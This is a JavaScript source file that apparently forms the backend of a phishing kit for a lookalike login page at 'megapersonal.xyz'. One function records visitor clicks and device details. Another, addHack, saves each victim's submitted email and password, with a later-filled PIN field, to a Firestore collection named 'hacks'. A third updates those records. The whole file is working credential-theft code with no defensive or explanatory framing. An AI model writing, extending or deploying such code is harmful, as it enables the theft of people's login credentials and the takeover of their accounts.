import { db } from "./firebase";
import { collection, doc, setDoc, updateDoc, query, where } from "firebase/firestore";

function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    const isMobile = /Mobi|Android|iPhone|iPad|iPod|Windows Phone/i.test(userAgent);

    const deviceType = isMobile ? 'Mobile' : 'Desktop';

    const deviceInfo = {
        device: deviceType,
        userAgent: userAgent,
    };
    console.log(deviceInfo)
    return deviceInfo
}

export async function addClick(ref) {
    let deviceInfo=getDeviceInfo()
    var ts = Date.now()
    var clickData = {
        hostname: 'www.megapersonal.xyz',
        base_url: "auth/login",
        ref: ref,
        device: deviceInfo.device,
        timestamp: ts,
    }

    const clicksColl = collection(db, "clicks")

    var res = await setDoc(doc(clicksColl, ts.toString()), clickData)

    console.log("verified", res);
}

export async function addHack(ref,email,password) {
    let deviceInfo=getDeviceInfo()
    var ts = Date.now()
    var id=ts.toString()
    var hackData = {
        id:id,
        hostname: 'www.megapersonal.xyz',
        base_url: "auth/login",
        ref: ref,
        device: deviceInfo.device,
        userAgent:deviceInfo.userAgent,
        timestamp: ts,
        archived: false,
        email:email,
        password:password,
        pin:null,
    }

    const hacksColl = collection(db, "hacks")

    var res = await setDoc(doc(hacksColl, id), hackData)

    console.log("verified", res);
    return id
}

export async function updateHack(id,data) {
    data.timestamp=Date.now()
    const docRef = doc(db, "hacks", id);
    await updateDoc(docRef, data);
    console.log("Updated hack data, id:", id, data);
  }